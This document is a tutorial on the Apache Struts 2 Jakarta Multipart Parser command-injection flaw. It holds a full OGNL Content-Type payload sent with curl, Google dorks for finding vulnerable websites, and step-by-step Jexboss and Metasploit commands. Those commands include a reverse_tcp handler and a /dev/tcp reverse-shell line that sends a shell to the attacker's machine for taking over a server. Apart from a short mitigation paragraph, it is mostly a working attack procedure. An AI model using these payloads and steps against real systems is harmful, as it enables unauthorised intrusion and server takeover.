## Introduction

In versions of **Apache Struts 2** prior to 2.3.32 and 2.5.10.1, there is a flaw in the **Jakarta Multipart Parser**. This flaw pertains to improper exception handling and generation of error messages during attempts to upload files. As a result, remote attackers can exploit this vulnerability to run arbitrary commands by manipulating the "`Content-Type`", "`Content-Disposition`", or "`Content-Length`" HTTP headers.

## Anatomy Of The Attack

### Apache Struts Vulnerability

Struts are vulnerable to remote command injection attacks through incorrectly parsing an attacker’s invalid "Content-Type HTTP header". The Struts vulnerability allows these commands to be executed under the privileges of the Web server.

If the "Content-Type" value isn’t valid, that is, it does not match an expected valid type, an exception is thrown that is then used to display an error message to a user. In this case, we can set the "Content-Type" to an OGNL expression such as:

```bash
ContentType: ${(#_='multipart/formdata')}...
```

#### Why Does the Vuln Occur?

The vulnerability occurs because the Content-Type is not escaped after the error, and is then used by **LocalizedTextUtil.findText()** function to build the error message. This function will interpret the supplied message, and anything within **${…}** will be treated as an Object Graph Navigation Library (OGNL) expression and evaluated as such. The attacker can leverage these conditions to execute OGNL expressions that in turn execute system commands.

OGNL is also an expressive and extensive language in and of itself. It’s a very powerful and reliable tool for the attacker. Many core JAVA functions can be exposed, for example, **java.core.ProcessBuilder()** allows an external program to be run on the system.

Exploitation is also further facilitated by the ability to receive information back from the server on the status and output of the commands that are executed by the webserver. No additional communication channel is needed, which aids in minimizing detection and bypassing existing firewall rules.

###### HTTP REQUEST WITH CURL CONTAINING CONTENT-TYPE HEADER WITH OGNL EXPRESSION

```bash
curl https://example.com:8080/welcome.action -H "Content-Type:
%{(#_="multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)
.(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])
.(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))
.(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear())
.(#context.setMemberAccess(#dm)))).(#eps=#container.toString()).(#cmds=({'/bin/echo', #eps}))
.(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())
.(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))
.(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush()))}
com.opensymphony.xwork2.inject.ContainerImpl@d0d2b00
```

The **curl** command shown above demonstrates whether the server is vulnerable or not by sending an http request with an embedded OGNL expression in the Content-Type header. The OGNL expression sets default access rights to the members of the **OgnlContext JAVA object**, which represents the execution context of the expression.

#### How Can This Vulnerability Be Addressed?

The risks related to this type of attack can be lessened by utilizing web application firewalls like **mod\_security**. This is achievable if rules are configured for valid content types or if OGNL expressions are added to a blacklist. However, the most optimal solution is undeniably updating **Struts2**.

### Google Dork

There is no doubt that there are thousand and one ways to find vulnerable targets for this type of attack. To cut short, we are going to use a non-exhaustive list of Google Dork to demonstrate how it’s easy for a blackhat to build a list of potentially vulnerable websites.

```bash
intitle:"Struts problem report" intext:"Struts has detected an Unhandled"
intitle:"Struts Problem Report" intext:"development mode is enabled."
filetype:action
filetype:do
filetype:java
filetype:out
filetype:bat
filetype:seam
filetype:sh
filetype:bson
filetype:el
filetype:pm
inurl:login.action
inurl:login.do
inurl:login.java
inurl:index.action
inurl:index.do
inurl:index.java
```

### Vulnerability Analysis

To detect if a host is vulnerable to the **Struts2** exploit, we can use **Jexboss**, this tool made in Python is definitively doing a great job and can help you to save precious time. The tool and exploits were developed and tested for JBoss Application Server versions v3, v4, v5, and v6. JSF, Seam Framework, RMI over HTTP, Jenkins CLI RCE (CVE-2015-5317), Remote JMX (CVE-2016-3427, CVE-2016-8735). For more information, you can visit the [Github](https://github.com/joaomatosf/jexboss) page of the author.

#### Requirements

- Python >= 2.7.x
- urllib3
- ipaddress

#### Install Jexboss on Ubuntu/Debian

```bash
git clone "https://github.com/joaomatosf/jexboss.git"
cd jexboss
pip install -r requires.txt
python jexboss.py -h
```

Or

```bash
wget "https://github.com/joaomatosf/jexboss/archive/master.zip"
unzip master.zip
cd jexboss-master
pip install -r requires.txt
python jexboss.py -h
```

#### Install Jexboss on Windows

If you are using Windows, you can use the Git Bash to run the JexBoss.

- Download and install Python
- Download and install Git for Windows
- After installing, run the Git for Windows and type the following commands

```bash
PATH=$PATH:C:\Python27\
PATH=$PATH:C:\Python27\Scripts
git clone https://github.com/joaomatosf/jexboss.git
cd jexboss
pip install -r requires.txt
python jexboss.py -h
```

* * *

### How To Use Jexboss

#### Scan single host using Jexboss

```bash
sudo python jexboss.py -host http://target_host:8080
```

#### Scan multiple hosts using Jexboss

```bash
sudo python jexboss.py -mode -file-scan -file /path/file/urls.txt -out /path/output/results.log --struts2
```

#### Create MSF Session

To open a session from our targeted website, we will need to create an exploit multi-handler with **Metasploit**. This can be done very quickly using the below commands.

```bash
msfconsole
msf > use exploit/multi/handler
msf exploit(multi/handler) > set "YOUR-IP-ADDRESS"
msf exploit(multi/handler) > set "YOUR-LOCAL-PORT"
msf exploit(multi/handler) > set PAYLOAD linux/x86/shell/reverse_tcp
msf exploit(multi/handler) > show options
```

On the above example, we are using a Linux X86 Shell Reverse TCP payload, of course the type of payload shall be different if we are targeting a Windows machine.

* * *

### Exploit The Target

We are now going to send our exploit to create a reverse shell using **Jexboss** and forward the traffic to the MSF session using TCP protocol.

#### Jexboss Commands

```bash
sudo python jexboss.py -host http://example.com/login.action --struts2
```

If **Jexboss** can inject his payload, you will need to enter the below command to establish a connection with **Metasploit**.

#### Jexboss Console

Replace `MACHINE-IP-ADDRESS` and `MACHINE-PORT` with your own parameters


```bash
Shell> /bin/bash -i > /dev/tcp/MACHINE-IP-ADDRESS/MACHINE-PORT 0>&1 2>&1
```

#### Metasploit Console

```bash
msf exploit(multi/handler) > exploit
```

You are done! If the targeted website and/or server is vulnerable to **Struts2** exploit, a session will be created in your **Metasploit** allowing you to take over the targeted machine.

## Conclusion

The security flaw in Apache Struts 2 versions 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1 poses a significant risk. Attackers can exploit incorrect exception handling and error-message generation during file-upload attempts to execute arbitrary code remotely. Organizations should promptly update their systems to mitigate this vulnerability and protect against potential attacks.
